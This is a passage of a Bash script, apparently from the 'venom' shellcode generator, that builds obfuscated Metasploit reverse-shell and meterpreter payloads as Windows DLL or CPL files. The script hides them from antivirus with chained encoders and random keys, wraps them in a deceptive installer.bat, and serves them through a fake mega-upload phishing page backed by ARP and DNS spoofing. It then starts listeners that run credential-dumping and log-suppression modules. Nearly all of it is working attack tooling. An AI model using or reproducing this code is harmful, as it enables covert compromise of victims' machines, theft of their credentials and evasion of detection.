    sleep 1
    echo ${BlueF}[*]${white} copy post-module to msfdb ..${Reset};
    cp $IPATH/aux/msf/linux_hostrecon.rb $pHanTom/post/linux/gather/linux_hostrecon.rb > /dev/null 2>&1
    echo ${BlueF}[☠]${white} Reloading msfdb database ..${Reset};
    sleep 2
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
  fi

else

echo "nothing to do here" > /dev/null 2>&1

fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      # copy from output
      cd $IPATH/output
      cp $N4m $ApAcHe/$N4m > /dev/null 2>&1
      echo "${BlueF}[☠]${white} loading -> Apache2Server!"${Reset};
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m $ApAcHe/$N4m
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo ${BlueF}[☠]${white} Start a multi-handler...${Reset};
        echo ${BlueF}[☠]${white} Press [ctrl+c] or [exit] to 'exit' meterpreter shell${Reset};
        echo ${BlueF}[☯]${white} Please dont test samples on virus total...${Reset};
          if [ "$MsFlF" = "ON" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi

        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo ${BlueF}[☠]${white} Start a multi-handler...${Reset};
        echo ${BlueF}[☠]${white} Press [ctrl+c] or [exit] to 'exit' meterpreter shell${Reset};
        echo ${BlueF}[☯]${white} Please dont test samples on virus total...${Reset};
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi


## CLEANING EVERYTHING UP
echo ${BlueF}[☠]${white} Cleanning temp generated files...${Reset};
mv $IPATH/templates/exec[bak].c $InJEc
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
sh_menu

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_menu
  clear
fi
}




# -----------------------------------------------------------------
# build shellcode in DLL format (windows-platforms)
# mingw32 obfustated using astr0baby method and build installer.bat
# to use in winrar/sfx 'make payload executable by pressing on it'
# -----------------------------------------------------------------
sh_shellcode2 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1
# input agent final name
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: astr0baby" --width 300) > /dev/null 2>&1
# chose agent final extension (.dll or .cpl)
Ext=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable agent extensions:\nThere is a niftty trick involving dll loading behavior under windows.\nIf we rename our agent.dll to agent.cpl we now have an executable\nmeterpreter payload that we cant doubleclick and launch it.." --radiolist --column "Pick" --column "Option" TRUE "$N4m.dll" FALSE "$N4m.cpl" --width 300 --height 150) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="astr0baby";fi
if [ "$Ext" = "$N4m.dll" ]; then
   Ext="dll"
else
   Ext="cpl"
fi


echo "[☠] Loading uuid(@nullbyte) obfuscation module .."
sleep 1
echo "[☠] Building shellcode -> C format ..."
sleep 2
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   echo "[☠] meterpreter over SSL sellected ..";sleep 1
fi


echo "" > $IPATH/output/chars.raw
# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : C -> WINDOWS
    PAYLOAD : $paylo

!

# use metasploit to build shellcode
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f c > $IPATH/output/chars.raw"
else
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c > $IPATH/output/chars.raw"
fi


echo ""
# display generated shelcode
cat $IPATH/output/chars.raw
echo "" && echo ""
sleep 2

   # check if all dependencies needed are installed
   # check if template exists
   if [ -e $InJEc5 ]; then
      echo "[☠] exec_dll.c -> found!"
      sleep 2
   else
      echo "[☠] exec_dll.c -> not found!"
      exit
   fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi

   # check if mingw32 exists
   audit=`which $ComP`> /dev/null 2>&1
   if [ "$?" -eq "0" ]; then
      echo "[☠] mingw32 compiler -> found!"
      sleep 2
 
   else

      echo "[☠] mingw32 compiler -> not found!"
      echo "[☠] Download compiler -> apt-get install mingw32"
      echo ""
      sudo apt-get install mingw32
      echo ""
      fi


# EDITING/BACKUP FILES NEEDED
echo "[☠] editing/backup files..."
cp $InJEc5 $IPATH/templates/exec_dll[bak].c
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html

cd $IPATH/templates
# use SED to replace IpADr3 and P0rT
echo "[☠] Injecting shellcode -> $N4m.dll!"
sleep 2
sed -i "s|IpADr3|$lhost|g" exec_dll.c
sed -i "s|P0rT|$lport|g" exec_dll.c

# obfuscation ??
UUID_1=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 150 | head -n 1)
sed -i "s|UUID-RANDOM|$UUID_1|g" exec_dll.c




echo "[✔] Using random UUID keys (evade signature detection)"
sleep 2
echo ""
echo "    Generated key:$UUID_1"
echo ""
sleep 1



if [ "$Ext" = "dll" ]; then
  # build winrar-SFX installer.bat script
  echo "[☠] Building winrar/SFX -> installer.bat..."
  sleep 2
  echo ":: SFX auxiliary | Author: r00t-3xp10it" > $IPATH/output/installer.bat
  echo ":: this script will run payload using rundll32" >> $IPATH/output/installer.bat
  echo ":: ---" >> $IPATH/output/installer.bat
  echo "@echo off" >> $IPATH/output/installer.bat
  echo "echo [*] Please wait, preparing software ..." >> $IPATH/output/installer.bat
  echo "rundll32.exe $N4m.dll,main" >> $IPATH/output/installer.bat
  echo "exit" >> $IPATH/output/installer.bat
  sleep 2
fi


# COMPILING SHELLCODE USING mingw32
echo "[☠] Compiling/obfuscating using mingw32..."
sleep 2
# special thanks to astr0baby for mingw32 -lws2_32 -shared (dll) flag :D
$ComP exec_dll.c -o $N4m.dll -lws2_32 -shared
strip $N4m.dll

if [ "$Ext" = "dll" ]; then
   mv $N4m.dll $IPATH/output/$N4m.dll
else
   mv $N4m.dll $IPATH/output/$N4m.cpl
fi




# CHOSE HOW TO DELIVER YOUR PAYLOAD
if [ "$Ext" = "dll" ]; then
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.dll\n$IPATH/output/installer.bat\n\nExecute on cmd: rundll32.exe $N4m.dll,main\n\nchose how to deliver: $N4m.dll" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 260) > /dev/null 2>&1
else
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.cpl\n\nchose how to deliver: $N4m.cpl" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 260) > /dev/null 2>&1
fi


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then

          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi

          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else

          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi
        fi
      sleep 2


   else


      # user settings
      if [ "$Ext" = "dll" ]; then
      N4m2=$(zenity --title="☠ SFX Infection ☠" --text "WARNING BEFOR CLOSING THIS BOX:\n\nTo use SFX attack vector: $N4m.dll needs to be\ncompressed together with installer.bat into one SFX\n\n1º compress the two files into one SFX\n2º store SFX into shell/output folder\n3º write the name of the SFX file\n4º press OK to continue...\n\nExample:output.exe" --entry --width 360) > /dev/null 2>&1
      else
      N4m2="$N4m.$Ext"
      fi

P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 310) > /dev/null 2>&1



  if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
fi

      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m2|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m2 $ApAcHe/$N4m2 > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m2|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m2 $ApAcHe/$N4m2
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi
          fi


        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi
          fi
        fi
   fi


# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/exec_dll[bak].c $InJEc5 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $IPATH/templates/copy.c > /dev/null 2>&1
rm $IPATH/templates/copy2.c > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/$N4m.$Ext > /dev/null 2>&1
rm $ApAcHe/$N4m2 > /dev/null 2>&1
rm $ApAcHe/installer.bat > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}





# -------------------------------------------------
# build shellcode in DLL format (windows-platforms)
# and build installer.bat to use in winrar/sfx
# 'make payload executable by pressing on it'
# -------------------------------------------------
sh_shellcode3 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1
N4m=$(zenity --title="☠ DLL NAME ☠" --text "example: DllExploit" --entry --width 300) > /dev/null 2>&1
# chose agent final extension (.dll or .cpl)
Ext=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable agent extensions:\nThere is a niftty trick involving dll loading behavior under windows.\nIf we rename our agent.dll to agent.cpl we now have an executable\nmeterpreter payload that we cant doubleclick and launch it.." --radiolist --column "Pick" --column "Option" TRUE "$N4m.dll" FALSE "$N4m.cpl" --width 300 --height 150) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="DllExploit";fi
if [ "$Ext" = "$N4m.dll" ]; then
   Ext="dll"
else
   Ext="cpl"
fi


echo "[☠] Building shellcode -> dll format ..."
# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : DLL -> WINDOWS
    PAYLOAD : $paylo

!

# use metasploit to build shellcode
# new obfuscating method
if [ "$paylo" = "windows/x64/meterpreter/reverse_tcp" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -f dll -o $IPATH/output/$N4m.dll" > /dev/null 2>&1
else
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -a x86 -e x86/countdown -i 7 -f raw | msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 6 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 7 -f dll -o $IPATH/output/$N4m.dll" > /dev/null 2>&1
fi
echo ""
echo "[☠] editing/backup files..."
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html


if [ "$Ext" = "dll" ]; then
  echo "[☠] Injecting shellcode -> $N4m.dll!"
  sleep 2
  # build winrar-SFX installer.bat script
  echo "[☠] Building winrar/SFX -> installer.bat..."
  sleep 2
  echo ":: SFX auxiliary | Author: r00t-3xp10it" > $IPATH/output/installer.bat
  echo ":: this script will run payload using rundll32" >> $IPATH/output/installer.bat
  echo ":: ---" >> $IPATH/output/installer.bat
  echo "@echo off" >> $IPATH/output/installer.bat
  echo "echo [*] Please wait, preparing software ..." >> $IPATH/output/installer.bat
  echo "rundll32.exe $N4m.dll,main" >> $IPATH/output/installer.bat
  echo "exit" >> $IPATH/output/installer.bat
  sleep 2
else
  echo "[☠] Injecting shellcode -> $N4m.$Ext!"
  sleep 2
  mv $IPATH/output/$N4m.dll $IPATH/output/$N4m.$Ext
fi


# CHOSE HOW TO DELIVER YOUR PAYLOAD
if [ "$Ext" = "dll" ]; then
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.dll\n$IPATH/output/installer.bat\n\nExecute on cmd: rundll32.exe $N4m.dll,main\n\nchose how to deliver: $N4m.dll" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 260) > /dev/null 2>&1
else
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.cpl\n\nchose how to deliver: $N4m.cpl" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 260) > /dev/null 2>&1
fi


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log;  use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
        fi
      sleep 2


   else


      if [ "$Ext" = "dll" ]; then
      N4m2=$(zenity --title="☠ SFX Infection ☠" --text "WARNING BEFORE CLOSING THIS BOX:\n\nTo use SFX attack vector: $N4m.dll needs to be\ncompressed together with installer.bat into one SFX\n\n1º compress the two files into one SFX\n2º store SFX into shell/output folder\n3º write the name of the SFX file\n4º press OK to continue...\n\nExample:output.exe" --entry --width 360) > /dev/null 2>&1
      else
      N4m2="$N4m.$Ext"
      fi

